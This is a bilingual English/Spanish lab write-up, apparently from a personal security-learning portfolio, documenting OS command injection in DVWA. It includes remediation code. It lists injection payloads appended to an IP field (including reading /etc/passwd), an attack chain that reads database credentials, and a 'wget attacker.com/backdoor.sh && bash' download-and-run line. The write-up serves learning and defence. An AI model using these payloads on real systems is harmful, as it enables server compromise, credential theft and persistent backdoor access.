# Command Injection - Inyeccion de Comandos

## [ENGLISH]

# Command Injection in Server Infrastructure: Remote Code Execution Risk

## Executive Summary
Discovered Command Injection vulnerability allowing arbitrary system command execution. In a fintech environment, this could lead to complete server compromise, data exfiltration, and lateral movement across payment infrastructure.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Type | CWE-78: OS Command Injection |
| Severity | CRITICAL (CVSS 9.8) |
| Attack Vector | Network |
| User Interaction | None |

## Technical Analysis

**Vulnerable Parameter:** IP address input field

**Normal Request:**
```
127.0.0.1
```

**Malicious Payloads:**
```
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la
127.0.0.1; ifconfig
```

## Exploitation Results

### Command: whoami
**Result:** www-data
**Impact:** Identified web server user account

### Command: cat /etc/passwd
**Result:** Complete list of system users including root, mysql, postgres
**Impact:** User enumeration for privilege escalation

### Command: ifconfig
**Result:** Network configuration including internal IPs and MAC addresses
**Impact:** Network mapping for lateral movement

## Fintech Impact Scenario (Clip)

### Attack Chain:
1. Attacker finds command injection in payment API
2. Executes cat /var/www/config.php to obtain database credentials
3. Executes mysql -u root -p[password] -e "SELECT * FROM transactions" to access payment data
4. Executes wget http://attacker.com/backdoor.sh && bash backdoor.sh for persistent access

### Business Impact:
- Complete Server Compromise: Full control of payment infrastructure
- Data Breach: Access to all transaction records, card data
- Lateral Movement: Pivot to internal databases and services
- Regulatory Fines: PCI-DSS violation (Requirement 6.5.1)

### Estimated Damage:
- Full database access equals millions of transaction records
- Potential for unauthorized transfers
- Complete loss of customer trust

## Remediation

### Immediate:
```php
// Never pass user input directly to system commands
// Instead of:
$output = shell_exec("ping " . $_GET['ip']);

// Use input validation:
$ip = $_GET['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $output = shell_exec("ping -c 4 " . escapeshellarg($ip));
}
```

### Long-term:
1. Avoid system commands when possible - use native PHP functions
2. Whitelist allowed inputs (only valid IP addresses)
3. Use escapeshellarg() and escapeshellcmd()
4. Implement WAF rules to detect command injection patterns
5. Run web server with minimal privileges

## Tools Used
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- Firefox Developer Tools

## References
- OWASP Command Injection
- CWE-78: Improper Neutralization of Special Elements in OS Command
- PCI-DSS Requirement 6.5.1

---

## [ESPANOL]

# Inyeccion de Comandos en Infraestructura de Servidor: Riesgo de Ejecucion Remota de Codigo

## Resumen Ejecutivo
Se descubrio una vulnerabilidad de Inyeccion de Comandos que permite la ejecucion arbitraria de comandos del sistema. En un entorno fintech, esto podria llevar al compromiso total del servidor, exfiltracion de datos y movimiento lateral a traves de la infraestructura de pagos.

## Detalles de la Vulnerabilidad

| Campo | Valor |
|-------|-------|
| Tipo | CWE-78: Inyeccion de Comandos del SO |
| Severidad | CRITICA (CVSS 9.8) |
| Vector de Ataque | Red |
| Interaccion de Usuario | Ninguna |

## Analisis Tecnico

**Parametro Vulnerable:** Campo de entrada de direccion IP

**Solicitud Normal:**
```
127.0.0.1
```

**Payloads Maliciosos:**
```
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la
127.0.0.1; ifconfig
```

## Resultados de Explotacion

### Comando: whoami
**Resultado:** www-data
**Impacto:** Identificacion de la cuenta de usuario del servidor web

### Comando: cat /etc/passwd
**Resultado:** Lista completa de usuarios del sistema incluyendo root, mysql, postgres
**Impacto:** Enumeracion de usuarios para escalacion de privilegios

### Comando: ifconfig
**Resultado:** Configuracion de red incluyendo IPs internas y direcciones MAC
**Impacto:** Mapeo de red para movimiento lateral

## Escenario de Impacto Fintech (Clip)

### Cadena de Ataque:
1. Atacante encuentra inyeccion de comandos en API de pagos
2. Ejecuta cat /var/www/config.php para obtener credenciales de base de datos
3. Ejecuta mysql -u root -p[password] -e "SELECT * FROM transactions" para acceder a datos de pago
4. Ejecuta wget http://atacante.com/backdoor.sh && bash backdoor.sh para acceso persistente

### Impacto de Negocio:
- Compromiso Total del Servidor: Control completo de la infraestructura de pagos
- Filtracion de Datos: Acceso a todos los registros de transacciones y datos de tarjetas
- Movimiento Lateral: Pivote hacia bases de datos y servicios internos
- Multas Regulatorias: Violacion de PCI-DSS (Requisito 6.5.1)

### Dano Estimado:
- Acceso completo a base de datos equivale a millones de registros de transacciones
- Potencial para transferencias no autorizadas
- Perdida total de confianza del cliente

## Remediacion

### Inmediata:
```php
// Nunca pasar entrada de usuario directamente a comandos del sistema
// En lugar de:
$output = shell_exec("ping " . $_GET['ip']);

// Usar validacion de entrada:
$ip = $_GET['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $output = shell_exec("ping -c 4 " . escapeshellarg($ip));
}
```

### Largo Plazo:
1. Evitar comandos del sistema cuando sea posible - usar funciones nativas de PHP
2. Lista blanca de entradas permitidas (solo direcciones IP validas)
3. Usar escapeshellarg() y escapeshellcmd()
4. Implementar reglas WAF para detectar patrones de inyeccion de comandos
5. Ejecutar servidor web con privilegios minimos

## Herramientas Utilizadas
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- Firefox Developer Tools

## Referencias
- OWASP Command Injection
- CWE-78: Improper Neutralization of Special Elements in OS Command
- PCI-DSS Requisito 6.5.1

---
**Autor / Author:** Francisco Escalante
**Fecha / Date:** Enero / January 2026
**Entorno / Environment:** DVWA on Parrot OS
**GitHub:** github.com/Paxx16/cybersecurity-journey
